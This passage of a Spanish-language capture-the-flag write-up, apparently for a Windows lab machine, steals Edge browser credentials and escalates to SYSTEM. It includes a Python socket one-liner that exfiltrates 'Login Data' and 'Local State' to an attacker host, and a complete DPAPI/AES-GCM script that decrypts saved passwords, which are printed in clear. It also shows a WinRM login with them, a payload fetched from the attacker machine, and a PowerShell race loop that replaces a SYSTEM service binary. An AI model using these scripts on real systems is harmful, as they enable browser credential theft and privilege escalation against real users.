04/20/2024  11:10 AM    <DIR>          Vault
04/20/2025  11:29 AM    <DIR>          Windows
09/14/2018  11:19 PM    <DIR>          Windows Sidebar
               0 File(s)              0 bytes
              14 Dir(s)   4,544,319,488 bytes free
```

Veremos interesante que esta el `Edge` si investigamos dentro veremos la carpeta `User Data` y si listamos la misma...

```cmd
dir "C:\Users\web\AppData\Local\Microsoft\Edge\User Data"
```

Info:

```
Directory of C:\Users\web\AppData\Local\Microsoft\Edge\User Data

10/22/2025  10:54 AM    <DIR>          .
10/22/2025  10:54 AM    <DIR>          ..
04/20/2024  11:11 AM    <DIR>          Autofill
04/20/2024  11:11 AM    <DIR>          AutoLaunchProtocolsComponent
10/21/2025  01:31 PM    <DIR>          BrowserMetrics
10/21/2025  01:32 PM         4,194,304 BrowserMetrics-spare.pma
04/20/2024  11:11 AM    <DIR>          CertificateRevocation
04/20/2024  11:10 AM    <DIR>          Crashpad
10/22/2025  10:54 AM    <DIR>          Default
04/20/2024  11:11 AM    <DIR>          EADPData Component
04/20/2024  11:11 AM    <DIR>          Edge Designer
04/20/2024  11:11 AM    <DIR>          Edge Notifications
04/20/2024  11:11 AM    <DIR>          Edge Shopping
04/20/2024  11:11 AM    <DIR>          Edge Tipping
04/20/2024  11:11 AM    <DIR>          Edge Travel
04/20/2024  11:11 AM    <DIR>          Edge Wallet
04/20/2024  11:11 AM    <DIR>          EdgeOnnxRuntimeDirectML
04/20/2024  11:11 AM                 0 First Run
04/20/2024  11:11 AM                 0 FirstLaunchAfterInstallation
04/20/2024  11:11 AM    <DIR>          FirstPartySetsPreloaded
10/21/2025  01:30 PM            49,152 first_party_sets.db
10/21/2025  01:30 PM                 0 first_party_sets.db-journal
04/20/2024  11:11 AM             4,096 Functional SAN Data
10/21/2025  01:31 PM            61,832 Functional SAN Data-wal
04/20/2024  11:11 AM    <DIR>          GraphiteDawnCache
04/20/2024  11:11 AM    <DIR>          GrShaderCache
04/20/2024  11:11 AM    <DIR>          hyphen-data
10/21/2025  01:30 PM               120 Last Browser
10/21/2025  01:30 PM                13 Last Version
10/22/2025  10:54 AM            57,640 Local State
04/20/2024  11:11 AM    <DIR>          Nurturing
04/20/2024  11:11 AM    <DIR>          OriginTrials
04/20/2024  11:11 AM    <DIR>          PKIMetadata
04/20/2024  11:11 AM    <DIR>          RecoveryImproved
04/20/2024  11:11 AM    <DIR>          Safe Browsing
04/20/2024  11:11 AM    <DIR>          SafetyTips
04/20/2024  11:11 AM    <DIR>          ShaderCache
04/20/2024  11:11 AM    <DIR>          SmartScreen
04/20/2024  11:11 AM    <DIR>          Speech Recognition
04/20/2024  11:11 AM    <DIR>          Subresource Filter
04/20/2024  11:11 AM    <DIR>          Trust Protection Lists
04/20/2024  11:11 AM    <DIR>          TrustTokenKeyCommitments
04/20/2024  11:11 AM    <DIR>          Typosquatting
10/22/2025  10:54 AM                85 Variations
04/20/2024  11:11 AM    <DIR>          Web Notifications Deny List
04/20/2024  11:11 AM    <DIR>          WidevineCdm
04/20/2024  11:11 AM    <DIR>          WorkspacesNavigationComponent
04/20/2024  11:11 AM    <DIR>          ZxcvbnData
              11 File(s)      4,367,242 bytes
              37 Dir(s)   4,544,315,392 bytes free
```

Nos suelta mucha informacion, pero de toda esta info lo que mas nos interesa es la carpeta de `Local State` (contiene la clave de encriptación), sabiendo que hay una `DDBB` por detras de `SQL` veremos que hay un `Default` este generalmente guarda una carpeta llamada `Login Data` (`Base de datos SQLite` con usuarios/contraseñas).

Si lo listamos:

```cmd
dir "C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
```

Info:

```
Directory of C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Default

10/22/2025  10:54 AM            51,200 Login Data
               1 File(s)         51,200 bytes
               0 Dir(s)   4,542,599,168 bytes free
```

Veremos que si existe, por lo que se nos ocurre intentar decodificar la clave maestra de `local state` para asi poder obtener las credenciales del `login data` de forma muy resumida.

Vamos a pasarnos dichos archivos a nuestra maquina atacante utilizando `python3` si buscamos el binario en la maquina lo encontraremos, solo que no estaba en el `path` por lo que utilizaremos ruta absoluta para ejecutarlo.

```cmd
"C:\Program Files\Python311\python.exe" -c "import socket,os;s=socket.socket();s.connect(('<IP_ATTACKER>',<PORT1>));f=open(r'C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Default\Login Data','rb');s.sendfile(f);f.close();s.close();print('Login Data enviado');s=socket.socket();s.connect(('<IP_ATTACKER>',<PORT2>));f=open(r'C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Local State','rb');s.sendfile(f);f.close();s.close();print('Local State enviado')"
```

Ahora desde la maquina atacante estaremos a la escucha:

```shell
nc -lvnp <PORT1> > login_data.db

nc -lvnp <PORT2> > local_state.json
```

Si enviamos el comando anterior veremos esto:

```
Login Data enviado
Local State enviado
```

Y si volvemos donde nuestras escuchas veremos que se paso de forma correcta:

```
drwxr-xr-x root root 4.0 KB Wed Dec 17 11:43:56 2025 .
drwxr-xr-x root root 4.0 KB Wed Dec 17 11:40:18 2025 ..
.rw-r--r-- root root  56 KB Wed Dec 17 11:44:00 2025 local_state.json
.rw-r--r-- root root  50 KB Wed Dec 17 11:44:00 2025 login_data.db
```

Analizando los archivos veremos esto:

```shell
cat local_state.json | grep -o '"encrypted_key":"[^"]*"'
```

Info:

```
"encrypted_key":"RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAABzr42Q+SDgR78a6A6x6z+EEAAAAB4AAABNAGkAYwByAG8AcwBvAGYAdAAgAEUAZABnAGUAAAAQZgAAAAEAACAAAABZqUTKi+3PgIqd3Qa3HRY2/JCmSDJLECa+TMtiB0cTPAAAAAAOgAAAAAIAACAAAAB0hEH7C3oQN6ghOwRl2cHGV2G3/o/oobqZ3Zm0uQNUhjAAAAAWtJnWT3GsY2PXsMOl66xYaMIXJodfrvLK5HVzFOvcGuw1CJn8xvbLF0LLyaOLujdAAAAA+vRmKffc2JdtiXx3o7Pvxy5CiU8YAuklDgNkgE+eAFDiAhBb5ZWr7zp30+GtPk4qluAXDrum+QHtuygfoywpTw=="
```

Es la **clave maestra encriptada con DPAPI** de Edge un sistema que utiliza `windows` para codificar las cosas, pero tendremos que porbar a decodificarla antes si queremos seguir avanzando en la explotacion.

### DPAPI Decryption (Credential Extraction)

Pero despues de un rato no tendremos resultados, por lo que vamos a probar otro enfoque diferente.

El cifrado `DPAPI` está vinculado a la sesión de inicio de sesión del usuario. Dado que ejecutamos código como usuario (web), podemos llamar de forma transparente a la API de `Windows CryptUnprotectData()` para descifrar la clave maestra. Una vez obtenida la clave maestra, podemos descifrar las contraseñas en los datos de inicio de sesión.

```cmd
echo import sqlite3 > dpapi.py
echo import json >> dpapi.py
echo import base64 >> dpapi.py
echo import win32crypt >> dpapi.py
echo from Crypto.Cipher import AES >> dpapi.py
echo import os >> dpapi.py
echo. >> dpapi.py
echo def get_master_key(): >> dpapi.py
echo     local_state_path = os.path.join(os.environ['LOCALAPPDATA'], r"Microsoft\Edge\User Data\Local State") >> dpapi.py
echo     with open(local_state_path, 'r', encoding='utf-8') as f: >> dpapi.py
echo         local_state = json.load(f) >> dpapi.py
echo     encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key']) >> dpapi.py
echo     encrypted_key = encrypted_key[5:] >> dpapi.py
echo     decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1] >> dpapi.py
echo     return decrypted_key >> dpapi.py
echo. >> dpapi.py
echo def decrypt_password(encrypted_password, key): >> dpapi.py
echo     if not encrypted_password: return "" >> dpapi.py
echo     try: >> dpapi.py
echo         if encrypted_password.startswith(b'v10'): >> dpapi.py
echo             nonce = encrypted_password[3:15] >> dpapi.py
echo             ciphertext_tag = encrypted_password[15:] >> dpapi.py
echo             ciphertext = ciphertext_tag[:-16] >> dpapi.py
echo             tag = ciphertext_tag[-16:] >> dpapi.py
echo             cipher = AES.new(key, AES.MODE_GCM, nonce=nonce) >> dpapi.py
echo             return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8') >> dpapi.py
echo         return "[Not v10]" >> dpapi.py
echo     except Exception as e: return f"[Error: {e}]" >> dpapi.py
echo. >> dpapi.py
echo def main(): >> dpapi.py
echo     master_key = get_master_key() >> dpapi.py
echo     print(f"Master key: {master_key.hex()[:20]}...") >> dpapi.py
echo. >> dpapi.py
echo     login_db = os.path.join(os.environ['LOCALAPPDATA'], r"Microsoft\Edge\User Data\Default\Login Data") >> dpapi.py
echo     conn = sqlite3.connect(login_db) >> dpapi.py
echo     cursor = conn.cursor() >> dpapi.py
echo     cursor.execute("SELECT origin_url, username_value, password_value FROM logins") >> dpapi.py
echo. >> dpapi.py
echo     for url, user, pwd in cursor.fetchall(): >> dpapi.py
echo         print(f"\nURL: {url}") >> dpapi.py
echo         print(f"User: {user}") >> dpapi.py
echo         if pwd: >> dpapi.py
echo             decrypted = decrypt_password(pwd, master_key) >> dpapi.py
echo             print(f"Password: {decrypted}") >> dpapi.py
echo. >> dpapi.py
echo     conn.close() >> dpapi.py
echo. >> dpapi.py
echo if __name__ == "__main__": >> dpapi.py
echo     try: >> dpapi.py
echo         main() >> dpapi.py
echo     except Exception as e: >> dpapi.py
echo         print(f"Error: {e}") >> dpapi.py
```

Con esto habremos creado el archivo de forma correcta, por lo que vamos a ejecutarlo de esta forma:

```cmd
"C:\Program Files\Python311\python.exe" dpapi.py
```

Info:

```
Master key: c7f1ad7b079947b4bb1d...

URL: https://openai.com/
User: olivia.kat
Password: [Error: MAC check failed]

URL: http://eloquia.htb/accounts/login/
User: Olivia.KAT
Password: S3cureP@sswdIGu3ss

URL: https://eloquia.htb/
User: test
Password: testtest1234!

URL: https://chatgpt.com/
User: olivia.kat
Password: S3cureP@sswd3Openai
```

Esto ha funcionado por que...

Las credenciales de Edge están protegidas con **DPAPI**, el sistema de encriptación de Windows que **vincula los datos al usuario y máquina específicos**.

Al ejecutar el script como el usuario `web` en su propia sesión de Windows, la función `CryptUnprotectData()` pudo acceder automáticamente a:

* Las claves maestras almacenadas en el sistema
* El contexto de seguridad de la sesión activa
* Los datos de DPAPI vinculados a ese usuario

Esto **no habría funcionado en Kali** porque Linux no tiene acceso a las claves DPAPI del sistema Windows original. La desencriptación requiere ejecutarse **en el mismo contexto** donde se crearon las credenciales.

> Esquema visual

```
Local State (JSON)
     ↓
"encrypted_key" (Base64 + DPAPI)  
     ↓
Base64 decode → Blob DPAPI
     ↓
CryptUnprotectData() ←─────────┐
     ↓                         │
Clave AES master (32 bytes)    │
     ↓                         │
Desencriptar passwords AES-GCM │
     ↓                         │
¡Passwords en texto claro! ────┘ (usa credenciales usuario 'web')
```

Ahora vamos a probar las credenciales obtenidas con `WinRM` de esta forma:

```shell
evil-winrm -i <IP> -u Olivia.KAT -p 'S3cureP@sswdIGu3ss'
```

Info:

```
Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Olivia.KAT\Documents> whoami
eloquia\olivia.kat
```

## Escalate privileges

Si investigamos los procesos que se estan corriendo en esta maquina veremos lo siguiente:

```powershell
Get-Process | Where-Object {
    $_.ProcessName -notin @(
        "Idle", "System", "Registry", "smss", "csrss", "wininit", "winlogon",
        "services", "lsass", "svchost", "fontdrvhost", "dwm", "conhost", "LogonUI",
        "spoolsv", "MpDefenderCoreService", "MsMpEng", "NisSrv", "SecurityHealthService",
        "vm3dservice", "vmtoolsd", "VGAuthService", "MicrosoftEdgeUpdate",
        "msdtc", "dllhost", "CompatTelRunner", "WmiPrvSE", "wsmprovhost"
    )
} | Select-Object ProcessName, Id, @{Name="Path";Expression={$_.Path}} | Format-Table -AutoSize
```

Info:

```
ProcessName   Id Path
-----------   -- ----
certoc      1276
cmd         1440
cmd         2760
cmd         3076
cmd         3992
cmd         4268
cmd         4436
cmd         4992
cmd         5024
cmd         5224
cmd         5500
cmd         6084
Failure2Ban 2236
python       780
python      2444
python      4432
python      5152
python      5280
python      5324
python      5344
python      5352
python      5360
python      5368
python      5524
python      5656
python      5812
w3wp        2832
w3wp        3440
```

El que mas nos llama la atencion es el proceso de `Failure2Ban`, vamos a investigar un poco sobre el mismo.

```powershell
where.exe Failure2Ban 2>$null
```

Info:

```
FullName                                                                                                                              Length
--------                                                                                                                              ------
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe                                    13312
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe.config                             283
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.pdb                                    28160
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.vshost.exe                             22984
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.vshost.exe.config                      273
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.vshost.exe.manifest                    490
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\obj\Debug\Failure2Ban.csproj.FileListAbsolute.txt            1277
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\obj\Debug\Failure2Ban.csproj.GenerateResource.Cache          913
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\obj\Debug\Failure2Ban.csproj.ResolveComReference.cache       737
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\obj\Debug\Failure2Ban.csprojResolveAssemblyReference.cache   2379
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\obj\Debug\Failure2Ban.exe                                    13312
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\obj\Debug\Failure2Ban.pdb                                    28160
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\obj\Debug\Failure2Ban.ProjectInstaller.resources             180
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\obj\Release\Failure2Ban.csproj.FileListAbsolute.txt          1297
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\obj\Release\Failure2Ban.csproj.GenerateResource.Cache        913
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\obj\Release\Failure2Ban.csproj.ResolveComReference.cache     737
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\obj\Release\Failure2Ban.csprojResolveAssemblyReference.cache 2379
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\obj\Release\Failure2Ban.exe                                  13312
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\obj\Release\Failure2Ban.pdb                                  26112
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\obj\Release\Failure2Ban.ProjectInstaller.resources           180
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\Failure2Ban.csproj                                           3828
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban.sln                                                          923
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban.v11.suo                                                      56832
C:\Users\Olivia.KAT\Desktop\Failure2Ban - Prototype - Shortcut.lnk                                                                    1558
C:\Users\Olivia.KAT\Documents\Failure2Ban.exe
```

Veremos bastante inetersante la carpeta de `C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\` indica que es un proyecto en desarrollo que esta en funcionamiento, pero la verdadera vulnerabilidad esta en cuando observamos los permisos de los archivos dentro de esta carpeta.

```powershell
icacls "Failure2Ban.exe.config"
icacls "Failure2Ban.exe"
```

Info:

```
True
Failure2Ban.exe.config ELOQUIA\Olivia.KAT:(I)(RX,W)
                       NT AUTHORITY\SYSTEM:(I)(F)
                       BUILTIN\Administrators:(I)(F)
                       BUILTIN\Users:(I)(RX)
                       APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                       APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
                       
Failure2Ban.exe ELOQUIA\Olivia.KAT:(I)(RX,W)
                NT AUTHORITY\SYSTEM:(I)(F)
                BUILTIN\Administrators:(I)(F)
                BUILTIN\Users:(I)(RX)
                APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

Vemos que podemos modificar el `.config` y el `.exe` del servicio de `Failure2Ban`, tambien vamos a ver si se esta ejecutando como `SYSTEM`.

```powershell
Get-Process -Name "Failure2Ban" | ForEach-Object { if ($_.SessionId -eq 0) { "✅ SYSTEM (SessionId=0)" } else { "❌ NO SYSTEM (SessionId=$($_.SessionId))" } }
```

Info:

```
✅ SYSTEM (SessionId=0)
```

Veremos que si, por lo que podremos realizar un secuestro de binario, intercambiando el original por el nuestro malicioso que lea la `flag` de `root` para hacerlo mas limpio y que el `Defender` no nos lo detecte.

> Maquina Atacante

```shell
cat > service_hijack.c << 'EOF'
#include <windows.h>
#include <stdio.h>

int main() {
    // Leer la flag específica
    FILE* flag = fopen("C:\\Users\\Administrator\\Desktop\\root.txt", "r");
    FILE* output = fopen("C:\\Temp\\stolen_flag.txt", "w");
    
    if (output) {
        fprintf(output, "=== CTF EXPLOIT ===\n");
        
        if (flag) {
            fprintf(output, "FLAG FOUND:\n");
            char buffer[256];
            while (fgets(buffer, sizeof(buffer), flag)) {
                fprintf(output, "%s", buffer);
            }
            fclose(flag);
        } else {
            fprintf(output, "Could not open flag file directly.\n");
            // Intentar con cmd
            system("cmd /c type C:\\Users\\Administrator\\Desktop\\root.txt > C:\\Temp\\flag_cmd.txt 2>&1");
        }
        
        // También whoami para verificar privilegios
        fprintf(output, "\nExecuted as: ");
        system("whoami >> C:\\Temp\\stolen_flag.txt");
        
        fclose(output);
    }
    
    Sleep(30000);
    return 0;
}
EOF

# 2. Compilar
x86_64-w64-mingw32-gcc -O2 -s -o xpl.exe service_hijack.c

# 3. Verificar tamaño
ls -lh xpl.exe

# 4. Servir
python3 -m http.server 8000
```

> Maquina victima

```powershell
iwr http://<IP_ATTACKER>:8000/xpl.exe -OutFile "xpl.exe"
```

Despues de un rato analizando todo, veremos que el servicio se reinicia periodicamente, nosotros no tenemos privilegios para reiniciarlo, ni pararlo, por lo que tendremos que aprovechar realizando un `race condition` hasta que el servicio se reinicie y nos deje sobreescribir dicho binario con uno nuestro malicioso, vamos a crear un bucle en `PowerShell` de esta forma:

```powershell
# 1. Race condition (igual)
$svc = 'C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe'
$xpl = 'C:\Users\Olivia.KAT\Documents\xpl.exe'

Write-Host "=== RACE CONDITION ===" -ForegroundColor Cyan
Write-Host "Intentando sobrescribir binario..." -ForegroundColor Yellow

$attempts = 0
while ($true) {
    $attempts++

    try {
        Copy-Item $xpl $svc -Force -ErrorAction Stop
        Write-Host "`n✅ SOBRESCRITO en intento $attempts!" -ForegroundColor Green
        break
    } catch {
        Write-Host "." -NoNewline -ForegroundColor Gray
        Start-Sleep -Milliseconds 100  # Pequeña pausa
    }
}

# 2. Esperar ejecución
Write-Host "`nEsperando ejecución como SYSTEM (15 segundos)..." -ForegroundColor Yellow
Start-Sleep -Seconds 15

# 3. Buscar TODOS los archivos posibles
Write-Host "`n=== BUSCANDO RESULTADOS ===" -ForegroundColor Cyan

# Lista de archivos que podría crear el exploit
$possibleFiles = @(
    "C:\Temp\stolen_flag.txt",
    "C:\Temp\flag_cmd.txt",
    "C:\Temp\root.txt",
    "C:\Temp\flag_backup.txt",
    "C:\Temp\log.txt"
)

$found = $false
foreach ($file in $possibleFiles) {
    if (Test-Path $file) {
        Write-Host "🎉 ENCONTRADO: $file" -ForegroundColor Red
        type $file
        $found = $true
        Write-Host "---" -ForegroundColor Gray
    }
}

if (-not $found) {
    Write-Host "❌ No se encontraron archivos de flag" -ForegroundColor Red

    # Ver si al menos se creó el directorio temp
    if (Test-Path "C:\Temp") {
        Write-Host "✅ Directorio C:\Temp existe" -ForegroundColor Green
        Write-Host "Contenido:" -ForegroundColor Yellow
        dir "C:\temp" -ErrorAction SilentlyContinue
    } else {
        Write-Host "❌ Ni siquiera se creó C:\Temp" -ForegroundColor Red
        Write-Host "El exploit NO se ejecutó o falló completamente" -ForegroundColor Yellow
    }
}
```

Info:

```
.
.
.
.
.
.

✅ SOBRESCRITO en intento 748!

Esperando ejecución como SYSTEM (15 segundos)....

```

Despues de un rato vemos que funciono pero tendremos que esperar a que se vulva a reiniciar el servicio para que ejecute `SYSTEM` el binario modificado, una vez reiniciado de nuevo despues de un rato, vamos a comprobar que se creo la `flag`.

```powershell
dir C:\Temp
```

Info:

```
Directory: C:\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       12/17/2025   5:56 AM             72 stolen_flag.txt
```

Veremos que se creo de forma correcta, por lo que vamos a leerla:

```powershell
type C:\Temp\stolen_flag.txt
```

Info:

```
=== CTF EXPLOIT ===
FLAG FOUND:
f78b78dddcee07ba898d738438616122

Executed as:
```

Por lo que vemos lo ejecuto correctamente y obtendremos la `flag` del `admin`.

> root.txt

```
f78b78dddcee07ba898d738438616122
```
